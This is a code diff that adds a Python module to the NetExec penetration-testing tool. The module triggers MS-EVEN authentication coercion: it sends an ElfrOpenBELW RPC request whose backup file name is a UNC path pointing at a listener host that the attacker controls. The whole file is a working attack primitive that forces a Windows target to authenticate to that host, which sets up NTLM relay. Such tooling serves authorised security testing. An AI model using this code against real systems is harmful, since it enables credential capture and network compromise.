+++ nxc/modules/coerce_plus_method/MS_EVEN/ElfrOpenBELW.py
@@ -1,0 +1,13 @@
+from impacket.dcerpc.v5.even import ElfrOpenBELW
+from impacket.dcerpc.v5.dtypes import NULL
+
+from nxc.modules.coerce_plus_method.DCERPCSessionError import DCERPCSessionError
+
+
+def request(dce, listener):
+    request = ElfrOpenBELW()
+    request["UNCServerName"] = NULL  # '%s\x00' % listener
+    request["BackupFileName"] = f"\\??\\UNC\\{listener}\\abcdefgh\\aa"
+    request["MajorVersion"] = 1
+    request["MinorVersion"] = 1
+    dce.request(request)
